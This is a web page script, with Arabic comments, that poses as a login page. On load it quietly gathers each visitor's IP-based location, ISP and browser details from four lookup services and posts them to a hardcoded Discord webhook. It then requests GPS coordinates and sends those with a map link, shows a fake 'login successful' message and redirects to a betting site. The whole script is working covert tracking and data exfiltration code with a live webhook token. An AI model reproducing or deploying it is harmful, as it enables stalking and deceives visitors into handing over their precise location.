<script>
  const now = new Date().toLocaleString();
  const userAgent = navigator.userAgent;
  const webhookUrl = "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ";

  function sendMessage(content) {
    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content })
    });
  }

  function getMostCommon(arr) {
    const count = {};
    arr.forEach(val => {
      if (!val) return;
      count[val] = (count[val] || 0) + 1;
    });
    return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
  }

  // 1️⃣ أولًا: إرسال الموقع التقريبي مباشرة من الـ APIs
  function sendApproximateLocation() {
    Promise.all([
      fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
      fetch("https://ipwho.is/").then(res => res.json()),
      fetch("http://ip-api.com/json/").then(res => res.json()),
      fetch("https://ipapi.co/json/").then(res => res.json())
    ])
    .then(([info1, info2, info3, info4]) => {
      const countries = [info1.country, info2.country, info3.country, info4.country_name];
      const cities = [info1.city, info2.city, info3.city, info4.city];

      const bestCountry = getMostCommon(countries);
      const bestCity = getMostCommon(cities);

      const content = `🌍 زائر جديد (موقع تقريبي من IP):\n
الدولة المحسّنة: ${bestCountry}
المدينة المحسّنة: ${bestCity}

📍 من المصادر:
- ipinfo.io: ${info1.country} - ${info1.city}
- ipwho.is: ${info2.country} - ${info2.city}
- ip-api.com: ${info3.country} - ${info3.city}
- ipapi.co: ${info4.country_name} - ${info4.city}

🛰️ ISP:
- ipinfo.io: ${info1.org}
- ipwho.is: ${info2.connection?.isp || "N/A"}
- ip-api.com: ${info3.isp}
- ipapi.co: ${info4.org}

🖥️ المتصفح: ${userAgent}
📅 الوقت: ${now}`;

      sendMessage(content);
    });
  }

  // 2️⃣ بعدها: نحاول نجيب الموقع الدقيق باستخدام GPS
  function trySendGPSLocation() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
        const content = `🛰️ تم الحصول على الموقع الدقيق (GPS):\n
📌 الإحداثيات:
- Latitude: ${lat}
- Longitude: ${lon}
🔗 [عرض على خرائط جوجل](${gmaps})

🖥️ المتصفح: ${userAgent}
📅 الوقت: ${now}`;

        sendMessage(content);
      },
      (error) => {
        console.warn("GPS مرفوض أو غير متاح، لا يوجد موقع دقيق");
      },
      { timeout: 5000 }
    );
  }

  // تنفيذ الكود
  sendApproximateLocation(); // يبعت الموقع التقريبي فورًا
  trySendGPSLocation(); // يحاول يجيب الموقع الدقيق لو ممكن

  // الرسالة الظاهرة للمستخدم والريدايركت
  setTimeout(() => {
    document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
    setTimeout(() => {
      window.location.href = "https://1xbet.com";
    }, 3000);
  }, 3000);
</script>
